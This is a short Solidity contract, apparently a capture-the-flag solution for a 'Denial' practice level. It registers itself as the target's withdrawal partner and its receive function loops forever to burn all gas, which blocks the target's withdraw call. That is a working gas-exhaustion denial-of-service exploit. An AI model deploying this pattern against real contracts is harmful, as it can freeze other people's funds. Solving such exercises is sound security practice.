// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address _partner) external;
}

contract DenialAttacker2 is Ownable{

    IDenial public targetContract;

    constructor(address _initialOwner, address _initialContract) Ownable(_initialOwner) {
        targetContract = IDenial(_initialContract);
    }

    function attack() public{
        targetContract.withdraw();
    }

    function setPartner(address _partner) public onlyOwner {
        targetContract.setWithdrawPartner(_partner);
    }

    function setAttack(address _addr) public onlyOwner {
        targetContract = IDenial(_addr);
    }

    receive() external payable {
        // while (true) {
        //     assert(false);
        // }
        // assert(false);
        while (true) {

        }
    }

    
}